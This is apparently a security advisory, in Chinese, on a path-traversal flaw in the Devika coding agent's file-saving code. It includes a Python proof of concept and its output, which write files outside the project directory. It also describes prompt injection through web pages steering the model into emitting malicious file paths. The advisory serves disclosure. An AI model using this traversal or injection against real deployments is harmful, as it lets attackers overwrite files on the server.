# Devika：Coder 写文件路径逃逸项目目录（相对 ../ 与绝对路径）

## 描述

`Coder.save_code_to_project`（src/agents/coder/coder.py:68-80）把 LLM 输出解析出的 `file` 字段直接拼进 `os.path.join(self.project_dir, project_name, file['file'])`，无包含性校验：`../` 段与 POSIX 绝对路径都原样存活并写出项目目录之外。

## 影响

Agent 在浏览网页/处理任务时，页面内容可经提示注入引导模型输出恶意 `file` 字段，使 Devika 服务器以自身权限在任意可写路径落盘文件（覆盖配置、写入定时任务位置等）。攻击者输入 = agent 处理的不可信 web 内容；被击穿的边界 = 项目目录。

## PoC

```bash
cd <devika 源码目录>
python - << 'PYEOF'
import os, sys
sys.path.insert(0, ".")
from src.agents.coder.coder import Coder

c = Coder("repro")
# 模型输出被引导携带 ../ 的 file 字段（正常输出应是纯文件名）
c.save_code_to_project(
    [{"file": "../poc-escaped/PWNED_CW.txt", "code": "written outside"}], "repo")
# 绝对路径同样存活
c.save_code_to_project(
    [{"file": "/tmp/devika_cw_absolute.txt", "code": "absolute escape"}], "repro")

print("relative escape:", os.path.exists("data/projects/poc-escaped/PWNED_CW.txt"))
print("absolute escape:", os.path.exists("/tmp/devika_cw_absolute.txt"))
PYEOF
```

## 执行结果

```
relative escape (data/projects/poc-escaped/PWNED_CW.txt): True
absolute escape (/tmp/devika_cw_absolute.txt): True

$ ls -la data/projects/poc-escaped/
-rw-r--r-- 1 iot iot 15 Sep 15 09:54 PWNED_CW.txt
```
